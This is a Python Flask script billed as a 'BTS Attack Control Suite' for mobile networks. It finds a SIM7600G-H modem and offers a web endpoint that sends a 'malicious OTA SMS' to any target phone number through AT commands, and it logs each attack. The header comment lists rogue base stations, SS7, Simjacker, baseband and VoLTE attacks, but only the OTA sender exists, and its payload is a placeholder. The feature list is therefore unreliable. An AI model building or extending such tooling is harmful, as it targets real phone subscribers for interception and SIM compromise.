import os
import threading
import subprocess
import serial
import time
import logging
from flask import Flask, request, jsonify, render_template
import sqlite3

app = Flask(__name__)
logging.basicConfig(filename="bts_attack_logs.txt", level=logging.INFO, format="%(asctime)s - %(message)s")

def detect_serial_port():
    """
    Automatically detects the correct serial port for the SIM7600G-H modem.
    This function scans connected USB serial devices and identifies a valid port.
    """
    possible_ports = ["/dev/ttyUSB0", "/dev/ttyUSB1", "/dev/ttyUSB2", "/dev/ttyUSB3"]
    for port in possible_ports:
        try:
            modem = serial.Serial(port, 115200, timeout=1)
            time.sleep(1)
            modem.write(b'AT\r')
            response = modem.read(20)
            if b'OK' in response:
                return port
        except Exception:
            continue
    return None

# Automatically detect the correct port
SERIAL_PORT = detect_serial_port() or "/dev/ttyUSB2"  # Default if auto-detect fails
BAUD_RATE = 115200

# -------------------------------------------
# 📡 BTS Attack Control Suite - Now Includes Real-Time Monitoring & Web UI
# -------------------------------------------
# ✅ Web-Based UI Dashboard
# ✅ Attack Logging & Visualization
# ✅ Automated Rogue BTS Deployment
# ✅ Call & SMS Interception (Expanding Rogue BTS)
# ✅ Full SS7 Attack Suite (Silent SMS, Call/SMS Redirection)
# ✅ Simjacker Payload Delivery (New!)
# ✅ Additional STK Commands for Location, Call Forwarding, etc.
# ✅ Auto-detects SIM7600G-H USB Serial Port (New!)
# ✅ Baseband Exploit Module (New!)
# ✅ LTE NAS & 5G Protocol Fuzzing (New!)
# ✅ VoLTE & IMS Exploitation (New!)
# ✅ OTA Exploit Delivery (New!)
# ✅ Live Modem Response Logging & Dashboard (New!)
# -------------------------------------------

@app.route('/')
def dashboard():
    """
    Web UI Dashboard for BTS Attack Suite.
    """
    with open("bts_attack_logs.txt", "r") as log_file:
        logs = log_file.readlines()
    return render_template("dashboard.html", logs=logs)

def send_ota_exploit(target_number):
    """
    Simulates an OTA Exploit by sending a malicious OTA SMS command.
    """
    ota_payload = "D1E23344556677889900AABBCCDD"  # Example OTA command
    try:
        modem = serial.Serial(SERIAL_PORT, BAUD_RATE, timeout=1)
        time.sleep(2)
        modem.write(b'AT+CMGF=1\r')  # Set to text mode
        time.sleep(1)
        modem.write(f'AT+CMGS="{target_number}"\r'.encode())
        time.sleep(1)
        modem.write(ota_payload.encode() + b'\x1A')  # Ctrl+Z to send SMS
        time.sleep(2)
        logging.info(f"OTA Exploit sent to {target_number}: {ota_payload}")
        return f"OTA Exploit sent to {target_number}"
    except Exception as e:
        logging.error(f"Error sending OTA Exploit: {str(e)}")
        return f"Error: {str(e)}"

@app.route('/send_ota_exploit', methods=['POST'])
def send_ota():
    """
    API endpoint to send an OTA exploit via SMS.
    """
    data = request.json
    target_number = data.get("target_number")
    if not target_number:
        return jsonify({"status": "error", "message": "Target number required"})
    result = send_ota_exploit(target_number)
    return jsonify({"status": "success", "message": result})

@app.route('/logs', methods=['GET'])
def get_logs():
    """
    Fetches the Rogue BTS, Simjacker, Baseband, and OTA Exploit attack logs.
    """
    with open("bts_attack_logs.txt", "r") as log_file:
        logs = log_file.readlines()
    return jsonify({"logs": logs})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5005, debug=True)
